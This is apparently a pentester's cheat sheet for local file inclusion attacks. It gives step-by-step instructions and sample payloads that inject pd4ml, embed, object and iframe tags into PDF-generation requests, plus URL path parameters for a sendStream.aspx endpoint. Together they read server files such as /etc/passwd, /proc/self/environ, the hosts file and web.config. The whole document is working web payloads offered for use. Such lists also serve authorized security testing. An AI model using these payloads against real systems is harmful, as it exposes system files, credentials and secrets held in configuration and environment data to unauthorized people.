### LFI Payloads

## Payload can be used in the body of the PDF files before downloading

Step 1: Navigate to the application where it has a download option of a PDF

Step 2: Now provide the below payloads in any of the parameters of the request body

Step 3: forward it to the server and download the file, if the appliction is vulnerble you can download the requested file

Sample Payloads

            <pd4ml:attachment src=file:///etc/passwd></pd4ml:attachment>
            <pd4ml:attachment src=file:///proc/self/environ></pd4ml:attachment>
            <pd4ml:attachment src=file:///></pd4ml:attachment> 
            <pd4ml:attachment src=file:///efs></pd4ml:attachment>
            <embed src=file:///etc/passwd></embed>
            <object src=file:///etc/passwd></object>
            <iframe src=file:///etc/passwd></iframe>

## Payloads that can be used in the URL of the application

    sendStream.aspx?path=C:\Windows\System32\drivers\etc\hosts
    /sendStream.aspx?path=C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
    /sendStream.aspx?path=C:\inetpub\wwwroot\LsPressAdmin\web.config
    sendStream.aspx?path=C:\Windows\System32\drivers\etc\services
